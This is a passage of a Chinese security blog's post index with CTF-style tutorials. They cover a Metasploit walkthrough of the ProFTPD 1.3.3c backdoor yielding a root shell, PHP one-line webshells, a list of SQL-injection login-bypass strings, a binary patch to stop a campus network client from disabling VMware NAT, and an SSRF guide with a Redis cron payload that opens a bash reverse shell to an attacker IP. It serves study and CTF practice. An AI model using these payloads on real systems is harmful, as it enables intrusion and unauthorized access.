+<p>发现FTP服务<code>（端口号为21）</code></p>
+<p>记录FTP软件名以及版本号</p>
+<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
+<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
+</blockquote>
+<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
+
+<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
+                     
+                ></p>
+<p><strong>我们使用第二种方法</strong></p>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
+                      alt="2"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
+                      alt="3"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
+                      alt="4"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
+                      alt="5"
+                ></p>
+<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
+
+<p>成功获取flag</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>FTP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2024/09/11/776247657efa/</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>万能登陆密码</title>
+    <url>/2024/09/11/d77af8045ce5/</url>
+    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
+<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>admin’or 1&#x3D;1#</p>
+<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>
+
+
+
+]]></content>
+      <categories>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
+    <url>/2024/09/21/7d3ba1c32839/</url>
+    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
+<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
+<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
+<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
+<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
+<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
+                      alt="image-20240921185459092"
+                ></p>
+<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
+                      alt="image-20240921185425761"
+                ></p>
+<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
+                      alt="image-20240921185659129"
+                ></p>
+<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
+                      alt="image-20240921191031242"
+                ></p>
+<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
+                      alt="image-20240921191124399"
+                ></p>
+]]></content>
+      <categories>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+        <tag>校园网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>服务器请求伪造（SSRF）</title>
+    <url>/2024/09/11/fdbfb64754f6/</url>
+    <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
+<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
+<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
+<ul>
+<li>读取内网文件;</li>
+<li>扫描内网服务和端口;</li>
+<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
+<li>攻击运行在内网的系统或应用程序.</li>
+</ul>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
+<p><strong>web功能</strong></p>
+<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
+<ol>
+<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
+<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
+<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
+<li>图片加载与下载:通过URL地址加载或下载图片。</li>
+<li>通过api获取远程地址文件来加载内容。</li>
+</ol>
+<p><strong>URL关键字</strong></p>
+<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
+<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
+<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
+<p><strong>重要文件：</strong></p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
+<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
+<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
+</ol>
+<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
+<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
+<ol>
+<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
+</li>
+<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
+</li>
+</ol>
+<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
+<p>同样可以利用Burp进行爆破</p>
+<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
+<p><strong>攻击payload:</strong></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
+
+<p>然后攻击机进行监听</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
+
+<p>定时任务执行后就会反弹shell到攻击机</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SSRF</tag>
       </tags>
   </entry>
 </search>
